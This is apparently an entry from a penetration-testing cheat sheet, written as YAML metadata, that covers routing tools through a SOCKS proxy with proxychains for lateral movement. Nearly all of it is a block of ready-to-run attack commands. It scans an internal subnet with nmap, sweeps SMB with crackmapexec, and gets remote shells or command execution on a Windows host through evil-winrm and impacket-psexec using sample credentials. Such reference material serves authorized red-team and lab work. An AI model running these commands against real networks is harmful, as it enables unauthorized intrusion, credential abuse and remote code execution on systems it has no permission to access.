---
description: |
  Route tools through a SOCKS proxy for pivoting. Works with
  Chisel, Ligolo, SSH tunnels, and Metasploit.

  Reference values:
    Proxy Port: 1080
command: |
  # Edit /etc/proxychains4.conf
  # Add: socks5 127.0.0.1 1080

  # Run any tool through the proxy
  proxychains nmap -sT -Pn 172.16.1.0/24
  proxychains crackmapexec smb 172.16.1.0/24
  proxychains evil-winrm -i 172.16.1.10 -u admin -p 'password123'
  proxychains impacket-psexec test.local/admin:password123@172.16.1.10

  # With specific config file
  proxychains -f /tmp/proxychains.conf nmap -sT -Pn 172.16.1.10
phase:
  - Lateral_Movement
target_os:
  - Linux
  - Windows
services: []
items:
  - Shell
techniques:
  - Pivoting_Tunneling
network_position:
  - Internal
references:
  - https://github.com/haad/proxychains
---
